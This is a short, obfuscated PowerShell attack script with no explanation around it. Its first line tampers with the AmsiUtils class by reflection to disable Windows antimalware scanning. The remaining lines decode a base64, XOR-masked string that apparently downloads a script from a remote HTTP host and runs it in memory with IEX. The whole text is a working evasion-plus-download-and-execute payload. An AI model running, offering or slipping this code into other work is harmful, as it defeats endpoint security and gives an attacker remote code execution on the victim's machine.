[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType(("{5}{2}{0}{1}{3}{6}{4}" -f 'ut',('oma'+'t'+'ion.'),'.A',('Ams'+'iUt'),'ls',('S'+'ystem.'+'Manage'+'men'+'t'),'i')).GetField(("{1}{2}{0}" -f ('Co'+'n'+'text'),('am'+'s'),'i'),[Reflection.BindingFlags]("{4}{2}{3}{0}{1}" -f('b'+'lic'+',Sta'+'ti'),'c','P','u',('N'+'on'))).GetValue($null),0x44434241)
$a = "UCBPIFcgRSBSIFMgSCBFIEwgTCAAIGkgZSB4IAAgCCBuIEUgVyANIG8gQiBKIEUgQyBUIAAgbiBFIFQgDiB3IEUgQiBjIEwgSSBFIE4gVCAJIA4gZCBPIFcgTiBMIE8gQSBEIHMgVCBSIEkgTiBHIAggByBIIFQgVCBQIBogDyAPIBEgECAOIBEgECAOIBEgFCAOIBIgGiAYIBAgDyBBIAcgCSAqIA=="
$b = [System.Convert]::FromBase64String($a)
for ($x = 0; $x -lt $b.Count; $x++) {
                ${B}[${x}] = ${B}[${X}] -bxor 32
        }
IEX ([System.Text.Encoding]::Unicode.GetString($b))
